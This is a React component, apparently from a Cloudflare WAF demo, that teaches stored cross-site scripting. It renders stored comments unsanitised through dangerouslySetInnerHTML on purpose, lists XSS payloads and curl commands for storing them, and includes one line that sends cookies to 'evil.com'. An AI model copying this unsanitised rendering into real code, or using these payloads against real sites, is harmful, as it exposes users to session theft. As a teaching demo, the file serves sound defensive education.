import { Link, useFetcher, useLoaderData } from "react-router";
import { Code, ArrowLeft, AlertTriangle } from "lucide-react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card";
import { Input } from "../components/ui/input";
import { CodeBlock } from "../components/ui/code-block";
import type { Route } from "./+types/comments";

export async function loader({ context }: Route.LoaderArgs) {
  const db = context.cloudflare.env.DB;
  const comments = await db
    .prepare("SELECT c.*, u.username FROM comments c LEFT JOIN users u ON c.user_id = u.id ORDER BY c.created_at DESC")
    .all();
  return { comments: comments.results || [] };
}

export default function CommentsPage() {
  const { comments } = useLoaderData<typeof loader>();
  const fetcher = useFetcher();
  const isSubmitting = fetcher.state === "submitting";

  const curlExample = `curl -X POST "https://<your-worker-url>/api/comment" \\
  -H "Content-Type: application/json" \\
  -d '{"content":"<script>alert(\\'XSS\\')</script>"}'`;

  const xssPayloads = [
    { name: "Alert Box", payload: "<script>alert('XSS')</script>", description: "Basic JavaScript execution" },
    { name: "Image OnError", payload: "<img src=x onerror=alert('XSS')>", description: "Event handler-based XSS" },
    { name: "Body Onload", payload: "<body onload=alert('XSS')>", description: "Body tag with onload" },
    { name: "SVG Onload", payload: "<svg onload=alert('XSS')>", description: "SVG-based XSS" },
  ];

  return (
    <div className="min-h-screen bg-slate-950">
      <header className="border-b border-slate-800 bg-slate-950/50 px-4 py-4">
        <div className="mx-auto max-w-7xl flex items-center justify-between">
          <Link
            to="/"
            className="inline-flex items-center gap-2 rounded-md bg-slate-800/50 px-3 py-2 text-sm font-medium text-slate-400 hover:bg-slate-800 hover:text-white cursor-pointer transition-colors"
          >
            <ArrowLeft className="h-4 w-4" />
            Back to Home
          </Link>
          <div className="flex items-center gap-3">
            <div className="rounded-lg bg-orange-500/10 p-2">
              <Code className="h-6 w-6 text-orange-400" />
            </div>
            <div>
              <h1 className="text-xl font-semibold text-white">Cross-Site Scripting (XSS)</h1>
              <p className="text-sm text-slate-400">A03:2021 - Stored XSS attacks</p>
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-4xl px-4 py-8 space-y-6">
        {/* What is XSS */}
        <Card>
          <CardHeader>
            <CardTitle className="text-white">What is Cross-Site Scripting (XSS)?</CardTitle>
            <CardDescription>
              XSS flaws occur whenever an application includes untrusted data in a web page without proper 
              validation or escaping. Stored XSS persists on the server and executes for all users who view the content.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-2">
              <h4 className="font-medium text-slate-300">Common Exploits:</h4>
              <ul className="list-inside list-disc space-y-1 text-sm text-slate-400">
                <li>Steal session cookies with document.cookie</li>
                <li>Keylogging user input on the page</li>
                <li>Phishing attacks modifying page content</li>
                <li>Redirect users to malicious sites</li>
                <li>Execute actions on behalf of the user</li>
              </ul>
            </div>
          </CardContent>
        </Card>

        {/* Before WAF */}
        <Card className="border-orange-500/20 bg-orange-500/5">
          <CardHeader>
            <CardTitle className="text-orange-400">Before WAF: Vulnerable</CardTitle>
            <CardDescription>
              Without Cloudflare WAF, XSS payloads execute in visitors' browsers
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid gap-4 lg:grid-cols-2">
              <div>
                <h4 className="mb-2 font-medium text-slate-300">Post XSS Payload:</h4>
                <fetcher.Form method="post" action="/api/comment" className="space-y-3">
                  <textarea
                    name="content"
                    rows={3}
                    placeholder="<script>alert('XSS')</script>"
                    required
                    className="flex w-full rounded-md border border-slate-700 bg-slate-950 px-3 py-2 text-sm text-white"
                  />
                  <button type="submit" disabled={isSubmitting} className="w-full rounded-md bg-orange-500 px-4 py-2 text-sm font-medium text-white hover:bg-orange-600 disabled:opacity-50 cursor-pointer">
                    {isSubmitting ? "Posting..." : "Post XSS Payload"}
                  </button>
                </fetcher.Form>
              </div>
              <div>
                <h4 className="mb-2 font-medium text-slate-300">Or use cURL:</h4>
                <CodeBlock code={`# Store XSS payload
curl -X POST "<your-worker-url>/api/comment" \\
  -H "Content-Type: application/json" \\
  -d '{"content":"<script>alert('XSS')</script>"}'

# Script executes when anyone views comments!
# Steal cookies: <script>fetch('evil.com?c='+document.cookie)</script>`} />
              </div>
            </div>
            <div className="rounded-md bg-orange-500/10 p-3">
              <p className="text-sm text-orange-400">
                <strong>Vulnerability:</strong> User input stored and rendered without HTML sanitization.
              </p>
            </div>
          </CardContent>
        </Card>

        {/* Stored Comments Display */}
        <Card>
          <CardHeader>
            <CardTitle className="text-white">Comments (XSS Executes Here)</CardTitle>
            <CardDescription>
              View stored comments - scripts will execute!
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4 max-h-[400px] overflow-y-auto">
              {comments.length === 0 ? (
                <p className="text-slate-500 text-center py-4">No comments yet. Post an XSS payload!</p>
              ) : (
                comments.map((comment: any) => (
                  <div key={comment.id} className="rounded-md border border-slate-800 bg-slate-900/30 p-3">
                    <div className="mb-1 flex items-center justify-between">
                      <span className="font-medium text-slate-300">{comment.username || "Anonymous"}</span>
                      <span className="text-xs text-slate-500">{new Date(comment.created_at).toLocaleString()}</span>
                    </div>
                    <div className="text-sm text-slate-400" dangerouslySetInnerHTML={{ __html: comment.content }} />
                  </div>
                ))
              )}
            </div>
          </CardContent>
        </Card>

        {/* After WAF */}
        <Card className="border-emerald-500/20 bg-emerald-500/5">
          <CardHeader>
            <CardTitle className="text-emerald-400">After WAF: Protected</CardTitle>
            <CardDescription>
              With Cloudflare WAF, XSS payloads are stripped before reaching users
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <h4 className="mb-2 font-medium text-slate-300">Enable Cloudflare Protection:</h4>
              <ol className="list-inside list-decimal space-y-1 text-sm text-slate-400">
                <li>Go to Cloudflare Dashboard → Security → WAF</li>
                <li>Enable "Cloudflare Managed Ruleset"</li>
                <li>Enable "OWASP Core Ruleset"</li>
                <li>XSS rules automatically strip &lt;script&gt; tags</li>
              </ol>
            </div>
            <div className="rounded-md bg-emerald-500/10 p-3">
              <p className="text-sm text-emerald-400">
                <strong>Result:</strong> &lt;script&gt; tags and event handlers are blocked at the edge.
              </p>
            </div>
          </CardContent>
        </Card>

        {/* Cloudflare Features */}
        <Card>
          <CardHeader>
            <CardTitle className="text-white">Cloudflare WAF Protection</CardTitle>
          </CardHeader>
          <CardContent>
            <ul className="space-y-2 text-sm text-slate-400">
              <li className="flex items-start gap-2">
                <span className="text-emerald-400">✓</span>
                <span><strong>XSS Rules:</strong> Block &lt;script&gt; tags and event handlers</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-400">✓</span>
                <span><strong>HTML Sanitization:</strong> Remove dangerous tags from requests</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-emerald-400">✓</span>
                <span><strong>Content Security Policy:</strong> Enforce CSP headers</span>
              </li>
            </ul>
          </CardContent>
        </Card>
      </main>
    </div>
  );
}
